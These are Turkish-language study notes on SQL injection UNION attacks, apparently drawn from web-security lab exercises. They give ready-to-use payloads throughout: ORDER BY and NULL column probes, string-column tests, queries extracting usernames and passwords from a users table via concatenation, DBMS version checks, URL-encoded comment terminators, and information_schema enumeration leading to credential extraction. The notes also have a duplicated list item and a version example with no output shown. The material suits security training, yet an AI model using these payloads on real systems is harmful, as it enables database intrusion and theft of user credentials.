## 🎯 UNION Attack Nedir?
Uygulamanın yaptığı orijinal SQL sorgusunun sonuna kendi `SELECT` sorgumuzu ekleyerek, veritabanındaki **başka tablolardan veri çekip** ekrana yazdırma işlemidir.

**Çalışması için Altın Kural:** Orijinal sorgunun sonuçları uygulamanın yanıtında (web sayfasında) doğrudan ekrana yansıtılıyor (dönüyor) olmalıdır.

## 🧠 Temel Mantık ve Örnek
Orijinal sorgu ile bizim eklediğimiz sorgunun sonuçları tek bir tabloda birleşir.

```sql
-- Orijinal uygulamanın sorgusu (table1'den a ve b kolonlarını çeker)
SELECT a, b FROM table1 

UNION 

-- Bizim enjekte ettiğimiz sorgu (table2'den c ve d kolonlarını çeker)
SELECT c, d FROM table2
```

## ⚠️ UNION Kullanırken Altın Kurallar 
1. **Sütun Sayısı Eşitliği:** Birleştirilecek iki sorgunun döndürdüğü sütun (column) sayısı **kesinlikle aynı olmalıdır.** 2. **Veri Tipi Uyumu:** Karşılık gelen sütunların veri tipleri (metin, sayı vb.) birbiriyle uyumlu olmalıdır.
2. 2. **Veri Tipi Uyumu:** Karşılık gelen sütunların veri tipleri (metin, sayı vb.) birbiriyle uyumlu olmalıdır.
## 🔢 Adım 1: Orijinal Sorgunun Sütun Sayısını Bulma (`ORDER BY` Metodu) 
Kaç sütun olduğunu bilmediğimiz için, sıra numarasıyla sıralama yapan `ORDER BY` komutunu kullanarak test yaparız:

- `' ORDER BY 1--`
- `' ORDER BY 2--`
- `' ORDER BY 3--`
*(Hata alana veya sayfa tepki vermeyene kadar sayıyı artırırız)*

> [!NOTE] 💡 Nasıl Anlaşılır?
> Belirttiğimiz sütun indeksi tablodaki gerçek sütun sayısını aştığında veritabanı hata döndürür (Örn: *“ORDER BY position number 3 is out of range”*). Hatanın alındığı sayıdan bir önceki rakam, tablodaki **toplam sütun sayısını** verir.


## 🔢 Adım 1 (Alternatif): Sütun Sayısını Bulma (`NULL` Metodu)
`ORDER BY` yerine, her seferinde `NULL` sayısını artırarak deneme yapabilirsin. `NULL` her veri tipiyle uyumlu olduğu için çakışma riskini en aza indirir:

- `' UNION SELECT NULL--`
- `' UNION SELECT NULL,NULL--`
- `' UNION SELECT NULL,NULL,NULL--`
*(Hata kaybolana veya sayfada ek bir satır/değişiklik görülene kadar artırılır)*

> [!NOTE] 💡 Neden `NULL` Kullanıyoruz?
> Veritabanları arasındaki veri tipi uyuşmazlığı sorununu ortadan kaldırır. `NULL` her yaygın veri tipine dönüştürülebilir, bu sayede doğru sütun sayısına ulaşıldığında sorgunun patlama ihtimali en aza iner.

## Yararlı Bir Veri Türüne Sahip Stunları Bulma

Stun sayısını bulduktan sonra stunlar integer mı alıyor string mi bakmak için tek tek her stunu deneriz.

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Eğer sorgu hata vermezse **ve enjekte ettiğimiz 'a' karakteri sayfa içinde (ekranda) görünürse**, o sütunun string veri çekmek için uygun olduğunu bulmuş oluruz.


### UNION Attack - Hedef Verileri Çekme (Data Retrieval)

Sütun sayısını ve string veri tipine uygun sütunları tespit ettikten sonra, test için kullandığımız `NULL` değerleri yerine doğrudan çekmek istediğimiz tablonun ve sütunların isimlerini yazarız.

**Örnek Senaryo:**
- Hedef sistemde 2 sütun var ve ikisi de string kabul ediyor.
- Veritabanında `users` adında bir tablo olduğunu ve içinde `username`, `password` sütunları bulunduğunu biliyoruz (veya tahmin ediyoruz).

**Payload:**
```sql
' UNION SELECT username, password FROM users--
```

**Not:** Bu saldırının çalışması için tablo ve sütun isimlerini doğru bilmek şarttır. Bilinmiyorsa, modern veritabanlarında şema (schema) sorguları yapılarak bu isimler öğrenilebilir.

### UNION Attack - Tek Sütundan Birden Fazla Veri Çekme (Concatenation)

Eğer SQL Injection testleri sonucunda metin (string) kabul eden ve ekrana yansıyan **sadece tek bir sütun** bulabildiysek, birden fazla veriyi (örneğin hem kullanıcı adı hem şifre) aynı anda çekmek için **birleştirme (concatenation)** işlemi yaparız.

**Nasıl Yapılır?**
Çekmek istediğimiz verileri, aralarına okumayı kolaylaştıracak bir ayırıcı (örneğin `~`, `:`, `-`) koyarak tek bir metin dizesi haline getiririz.

**Örnek (Oracle Veritabanı):**
Oracle'da metin birleştirme operatörü çift boru `||` işaretidir. 

**Payload:**
```sql
' UNION SELECT username || '~' || password FROM users--
```

**Ekrana Yansıyan Sonuç (Çıktı):**
Çıktıda veriler arasına koyduğumuz ayırıcı ile tek bir satırda (sütunda) birleşik olarak döner:
```text
administrator~s3cure
wiener~peter
carlos~montoya
```

**Önemli Not:** Metin birleştirme (string concatenation) sözdizimi veritabanından veritabanına değişir. Örneğin Oracle ve PostgreSQL'de `||` kullanılırken, SQL Server'da `+`, MySQL'de ise `CONCAT()` fonksiyonu kullanılır. Hata alırsan **SQL Injection Cheat Sheet** üzerinden ilgili veritabanının syntax'ını kontrol etmelisin.

## Database Enumeration (Veritabanı Keşfi/Haritalandırma)

İçeride körü körüne ilerlemek yerine, hangi tabloların (örneğin `users`, `admin`, `customers`) ve bu tablolarda hangi kolonların (örneğin `password`, `email`, `credit_card`) olduğunu listeleyerek sistemin röntgenini çekersin.


# Veritabanı türünü ve sürümünü sorgulama

Sağlayıcıya özel sorgular enjekte edip hangisinin çalıştığını görerek potansiyel olarak hem veritabanı türünü hem de sürümünü belirleyebilirsiniz.

Aşağıdakiler, bazı popüler veritabanı türleri için veritabanı sürümünü belirlemeye yönelik bazı sorgulardır:

| Veritabanı türü  | Sorgu                     |
| :--------------- | :------------------------ |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

Örneğin, aşağıdaki girdiyi kullanarak bir `UNION` saldırısı gerçekleştirebilirsiniz:

```sql
' UNION SELECT @@version--
```

Bu işlem aşağıdaki çıktıyı döndürebilir. Bu durumda, veritabanının Microsoft SQL Server olduğunu doğrulayabilir ve kullanılan sürümü görebilirsiniz:


# SQL Injection - Veritabanı Yorum Satırı (Comment) Cheat Sheet

Farklı veritabanı sistemlerinde (DBMS) URL üzerinden (URL-encoded) payload denerken kullanılması gereken sonlandırma karakterleri:

| Veritabanı (DBMS) | Yorum Karakteri | URL-Encoded Hali | Örnek URL Payload | Önemli Kural / Not |
| :--- | :--- | :--- | :--- | :--- |
| **MySQL / MariaDB** | `#` veya `-- ` | `%23` veya `--+` | `'+UNION+SELECT+'a',+NULL%23` | `--` kullanılacaksa arkasından mutlaka **boşluk** (URL'de `+`) gelmelidir. |
| **PostgreSQL & SQLite** | `--` | `--` | `'+UNION+SELECT+'a',+NULL--` | Boşluk zorunluluğu yoktur, kodu doğrudan keser. |
| **MSSQL** | `--` | `--` | `'+UNION+SELECT+'a',+NULL--` | Boşluk zorunluluğu yoktur. |
| **Oracle** | `--` | `--` | `'+UNION+SELECT+'a',+NULL+FROM+dual--` | Veri çekilmese bile `FROM dual` (hayali tablo) kullanımı **zorunludur**. |



# Database Enumeration (UNION Attack)

Hedef sistemde kolon sayısını (örneğin 2) ve hangi kolonun string kabul ettiğini bulduktan sonra veritabanının haritasını çıkarmak için kullanılır.

*Not: Aşağıdaki payload'lar 2 kolonlu ve string değerin 1. kolonda olduğu senaryolar için yazılmıştır. Sonlandırma karakterini DBMS'ye göre (-- veya %23) değiştirin.*

### 1. Tablo İsimlerini Çekmek
Sistemdeki tabloları listeler. Amacımız ilgimizi çekecek (örneğin `users_xyz`) bir hedef tablo bulmaktır.

    ' UNION SELECT table_name, NULL FROM information_schema.tables--

### 2. Kolon İsimlerini Çekmek
Hedef tabloyu bulduktan sonra (örneğin tablo adı `users_xyz` olsun), bu tablonun içindeki kolon (sütun) isimlerini bulmak için kullanılır. Amacımız `username` veya `password` gibi hassas kolon adlarını tespit etmektir.

    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xyz'--

### 3. Veriyi Çekmek (Data Extraction)
Tablo adını ve içindeki kolon adlarını (örneğin `kullanici_adi` ve `sifre`) tespit ettikten sonra son vuruşu yapmak için kullanılır. 

    ' UNION SELECT kullanici_adi, sifre FROM users_xyz--
